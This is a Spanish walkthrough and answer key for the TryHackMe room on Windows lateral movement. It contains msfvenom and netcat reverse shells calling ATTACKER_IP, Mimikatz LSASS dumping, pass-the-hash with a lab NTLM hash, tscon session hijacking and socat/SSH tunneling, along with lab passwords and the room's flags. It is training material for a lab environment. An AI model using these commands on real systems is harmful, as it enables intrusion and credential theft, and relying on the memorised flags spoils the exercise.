# Lateral Movement and Pivoting

| **Dificultad** | Easy |
| **Tipo** | Walkthrough |
| **Slug** | `lateralmovementandpivoting` |
| **Link** | [TryHackMe](https://tryhackme.com/room/lateralmovementandpivoting) |
| **Sección** | 01 Level Easy |
| **Fuente** | Writeup de Kevinovitz (GitHub) + Cajac (GitHub) |
| **Componentes** | msfvenom / smbclient / sc.exe / WMI (CIM) / Mimikatz / Pass-the-Hash / PsExec / tscon / socat / SSH tunneling / Metasploit (rejetto_hfs_exec) |
| **Impacto** | Movimiento lateral completo sobre un dominio Windows: servicios remotos, WMI, hashes NTLM, secuestro de sesiones y port forwarding |

---

**Contexto:** Aprende sobre técnicas comunes usadas para moverse lateralmente a través de una red Windows. Cubre: Spawning Processes Remotely, Moving Laterally Using WMI, Use of Alternate Authentication Material, Abusing User Behaviour y Port Forwarding.

## Solucionario

### Task 1: Introduction

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Click and continue learning! | `No answer needed` |

**Explicación:** Configurar la conexión a la red: editar `/etc/resolve.conf` para incluir la IP del DC como servidor DNS y reiniciar el servicio de red.

### Task 2: Moving Through the Network

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Preguntas de lectura / reading questions) | `No answer needed` |

**Explicación:** El movimiento lateral es el grupo de técnicas usadas por los atacantes para moverse por una red. Es parte de un ciclo: usar credenciales disponibles para moverse lateralmente, acceder a nuevas máquinas, elevar privilegios y extraer credenciales.

### Task 3: Spawning Processes Remotely

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | After running the "flag.exe" file on t1_leonard.summers desktop on THMIIS, what is the flag? | `THM{MOVING_WITH_SERVICES}` |

**Explicación:** Crear un reverse shell con `msfvenom` y transferirlo al servidor THMIIS vía SMB con las credenciales de Leonard Summers. Luego crear y ejecutar un servicio en THMIIS.

```bash
msfvenom -p windows/meterpreter/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=1337 -o letmein.exe

smbclient -c 'put letmein.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```

En THMJMP2 (como Tony), usar `runas` para obtener un shell en el jump server:

```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1338"
```

Crear y arrancar el servicio en THMIIS:

```
sc.exe \\thmiis.za.tryhackme.com create service binPath= "%windir%\letmein.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start service
```

### Task 4: Moving Laterally Using WMI

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | After running the "flag.exe" file on t1_corine.waters desktop on THMIIS, what is the flag? | `THM{MOVING_WITH_WMI_4_FUN}` |

**Explicación:** Crear un payload MSI y transferirlo a THMIIS con las credenciales de Corine Waters. Luego usar WMI (CIM) para instalar el MSI remotamente.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=1337 -f msi > msi.msi

smbclient -c 'put msi.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```

```powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\msi.msi"; Options = ""; AllUsers = $false}
```

### Task 5: Use of Alternate Authentication Material

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag obtained from executing "flag.exe" on t1_toby.beck's desktop on THMIIS? | `THM{NO_PASSWORD_NEEDED}` |

**Explicación:** Usar credenciales de alto privilegio para acceder a THMJMP2 vía SSH y volcar los hashes NTLM de LSASS con Mimikatz. Luego pass-the-hash para obtener un shell en THMIIS.

```
C:\tools\mimikatz.exe
privilege::debug
sekurlsa::msv
```

Pass-the-hash:

```
sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 1337"
```

Mover a THMIIS con `winrs`:

```
winrs.exe -r:THMIIS.za.tryhackme.com cmd
```

### Task 6: Abusing User Behaviour

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What flag did you get from hijacking t1_toby.beck's session on THMJMP2? | `THM{NICE_WALLPAPER}` |

**Explicación:** Obtener nuevas credenciales de `http://distributor.za.tryhackme.com/creds_t2` y acceder a THMJMP2. Ejecutar `PsExec64.exe -s cmd.exe` y `query session` para listar conexiones RDP activas. Secuestrar la sesión de Toby Beck con `tscon`.

```
tscon 3 /dest:rdp-tcp#47
```

### Task 7: Port Forwarding

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the flag obtained from executing "flag.exe" on t1_thomas.moore's desktop on THMIIS? | `THM{SIGHT_BEYOND_SIGHT}` |
| 2 | What is the flag obtained using the Rejetto HFS exploit on THMDC? | `THM{FORWARDING_IT_ALL}` |

**Explicación:** Usar `socat` en THMJMP2 para reenviar el puerto RDP de THMIIS:

```
ssh za.tryhackme.com\\tony.holland@thmjmp2.za.tryhackme.com
socat TCP4-LISTEN:1337, TCP4:THMIIS.za.tryhackme.com:3389
```

Luego RDP a THMJMP2 en el puerto 1337 para llegar a THMIIS. Para el exploit de Rejetto HFS en THMDC, configurar un túnel SSH con un puerto remoto y dos puertos locales:

```
ssh tunneluser2@ATTACKER_IP -R 1337:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7777:127.0.0.1:7777 -N
```

Luego usar el exploit de Metasploit `rejetto_hfs_exec`.

### Task 8: Conclusion

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Preguntas de lectura / reading questions) | `No answer needed` |

**Explicación:** Conclusión del room. El movimiento lateral es un ciclo de credenciales → acceso → elevación → extracción de credenciales. Herramientas útiles para pivoting: Sshuttle, Rpivot, Chisel.

**Metodología:**
1. **Preparación:** editar `/etc/resolve.conf` para incluir la IP del DC como servidor DNS y reiniciar el servicio de red.
2. **Spawning Processes Remotely:** crear un reverse shell con `msfvenom -p windows/meterpreter/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=1337 -o letmein.exe` y subirlo a THMIIS vía `smbclient -c 'put letmein.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever`. En THMJMP2 (Tony) usar `runas /netonly` con las credenciales de Leonard, y crear/arrancar el servicio con `sc.exe \\thmiis... create service binPath= "%windir%\letmein.exe" start= auto` y `sc.exe start service` → flag `THM{MOVING_WITH_SERVICES}`.
3. **Moving Laterally Using WMI:** generar `msfvenom -p windows/x64/shell_reverse_tcp -f msi`, subirlo con t1_corine.waters (Korine.1994) y ejecutarlo vía CIM: `New-CimSession -Protocol DCOM` + `Invoke-CimMethod -ClassName Win32_Product -MethodName Install` → flag `THM{MOVING_WITH_WMI_4_FUN}`.
4. **Use of Alternate Authentication Material:** en THMJMP2 volcar LSASS con Mimikatz (`privilege::debug`, `sekurlsa::msv`) y hacer pass-the-hash del NTLM de t1_toby.beck con `sekurlsa::pth /user:... /ntlm:533f1bd576caa912bdb9da284bbc60fe`, moviéndote luego con `winrs.exe -r:THMIIS.za.tryhackme.com cmd` → `THM{NO_PASSWORD_NEEDED}`.
5. **Abusing User Behaviour:** obtener credenciales de `http://distributor.za.tryhackme.com/creds_t2`, ejecutar `PsExec64.exe -s cmd.exe` en THMJMP2 y, con `query session`, secuestrar la sesión RDP de Toby Beck con `tscon 3 /dest:rdp-tcp#47` → `THM{NICE_WALLPAPER}`.
6. **Port Forwarding:** en THMJMP2 usar `socat TCP4-LISTEN:1337, TCP4:THMIIS.za.tryhackme.com:3389` y conectar por RDP al puerto 1337 → `THM{SIGHT_BEYOND_SIGHT}`. Para el Rejetto HFS en THMDC, montar un túnel SSH (`-R 1337:thmdc...:80 -L *:6666... -L *:7777...`) y disparar `rejetto_hfs_exec` de Metasploit → `THM{FORWARDING_IT_ALL}`.

**Lección:** el movimiento lateral es un ciclo de credenciales → acceso → elevación → extracción de credenciales. Herramientas útiles: Sshuttle, Rpivot, Chisel.

**Learning chain:** credenciales → acceso → movimiento lateral (sc.exe, WMI, Pass-the-Hash, tscon) → elevación → extracción de credenciales → pivoting (socat/SSH) → THM{FORWARDING_IT_ALL}

**MITRE ATT&CK:** T1021 (Remote Services), T1550.002 (Use Alternate Authentication Material: Pass the Hash), T1563 (Remote Service Session Hijacking), T1543 (Create or Modify System Process), T1090 (Proxy), T1572 (Protocol Tunneling)

**Fuente:** [TryHackMe - Lateral Movement and Pivoting](https://tryhackme.com/room/lateralmovementandpivoting)
